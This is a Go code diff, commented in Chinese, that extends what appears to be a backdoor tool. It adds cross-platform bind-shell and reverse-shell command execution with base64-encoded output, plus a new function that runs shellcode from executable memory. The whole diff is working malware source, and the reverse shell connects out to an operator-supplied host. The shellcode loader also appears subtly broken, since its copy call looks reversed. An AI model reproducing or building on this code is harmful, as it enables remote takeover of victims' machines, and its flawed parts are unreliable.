@@ -4,13 +4,16 @@ import (
 	"bufio"
 	"encoding/base64"
 	"fmt"
+	"golang.org/x/sys/unix"
 	"io/ioutil"
 	"net"
 	"net/http"
 	"os"
 	"os/exec"
 	"path/filepath"
+	"runtime"
 	"strings"
+	"unsafe"
 )
 
 // OpenShell 本地开放端口 直连shell
@@ -42,26 +45,34 @@ func handleConnection(conn net.Conn) {
 	reader := bufio.NewReader(conn)
 
 	for {
-		message, err := reader.ReadString('\n') // 读取直到换行符
+		message, err := reader.ReadString('\n')
 		if err != nil {
 			fmt.Println("Read error:", err)
 			return
 		}
 
 		message = strings.TrimSpace(message)
-		output, err := exec.Command("bash", "-c", message).Output()
+		if message == "" {
+			continue
+		}
+
+		// 选择合适的 shell
+		var cmd *exec.Cmd
+		if runtime.GOOS == "windows" {
+			cmd = exec.Command("cmd", "/C", message) // Windows 使用 cmd
+		} else {
+			cmd = exec.Command("bash", "-c", message) // Linux/macOS 使用 bash
+		}
+
+		output, err := cmd.Output()
 		if err != nil {
 			fmt.Println("Command execution error:", err)
-			return
+			output = []byte(err.Error()) // 发送错误信息
 		}
 
 		encoded := base64.StdEncoding.EncodeToString(output)
 
-		// 发送编码后的数据（添加换行符作为消息分隔符）
 		_, err = conn.Write([]byte(encoded + "\n"))
-
-		//_, err = conn.Write(output)
-
 		if err != nil {
 			fmt.Println("Write error:", err)
 			return
@@ -78,6 +89,7 @@ func reShell(ip string, port string) {
 		return
 	}
 	defer conn.Close()
+
 	reader := bufio.NewReader(conn)
 	for {
 		message, err := reader.ReadString('\n') // 读取直到换行符
@@ -86,13 +98,25 @@ func reShell(ip string, port string) {
 			return
 		}
 		message = strings.TrimSpace(message)
+		if message == "" {
+			continue
+		}
 
-		output, err := exec.Command("bash", "-c", message).Output()
+		// 选择 shell
+		var cmd *exec.Cmd
+		if runtime.GOOS == "windows" {
+			cmd = exec.Command("cmd", "/C", message) // Windows 使用 cmd
+		} else {
+			cmd = exec.Command("bash", "-c", message) // Linux/macOS 使用 bash
+		}
+
+		output, err := cmd.CombinedOutput() // 获取 stdout 和 stderr
 		if err != nil {
 			fmt.Println("Command execution error:", err)
-			return
+			output = append(output, []byte("\n"+err.Error())...) // 添加错误信息
 		}
-		encoded := base64.StdEncoding.EncodeToString(output) //编码执行结果
+
+		encoded := base64.StdEncoding.EncodeToString(output) // 编码执行结果
 
 		// 发送编码后的数据（添加换行符作为消息分隔符）
 		_, err = conn.Write([]byte(encoded + "\n"))
@@ -100,7 +124,6 @@ func reShell(ip string, port string) {
 			fmt.Println("Write error:", err)
 			return
 		}
-
 	}
 }
 
@@ -185,4 +208,23 @@ func readFile(path string) ([]byte, error) {
 	}
 	defer file.Close()
 	return ioutil.ReadAll(file)
+}
+
+func loadShell(shellcode []byte) {
+	if runtime.GOOS == "windows" {
+	} else {
+		execMem, err := unix.Mmap(
+			-1,
+			0,
+			len(shellcode),
+			unix.PROT_READ|unix.PROT_WRITE|unix.PROT_EXEC, // RWX 权限
+			unix.MAP_PRIVATE|unix.MAP_ANONYMOUS,
+		) // 私有匿名映射
+		if err != nil {
+			panic("MemERR:" + err.Error())
+		}
+		copy(shellcode, execMem)
+		funcPtr := (*(*func())(unsafe.Pointer(&execMem)))
+		go funcPtr()
+	}
 }
